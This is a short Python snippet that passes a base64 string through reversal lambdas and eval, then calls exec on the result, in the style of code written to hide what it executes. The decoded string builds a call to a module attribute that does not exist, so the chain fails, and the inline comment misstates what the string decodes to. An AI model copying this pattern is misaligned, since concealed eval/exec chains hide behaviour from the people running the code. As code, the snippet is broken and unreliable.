import base64 as b
A = lambda x: x[::-1]
B = lambda x: eval(x)
C = "KGRlY29kZSgiZzN2YkdocGJXRnBiR1Z1WkE9PSIpKQ=="  # base64 of: decode("g3vbGhpblWFpbGVuZA==")
D = A(C)
E = A(D)
F = b.b64decode(E).decode()
G = B("b.b64" + F)
exec(G)
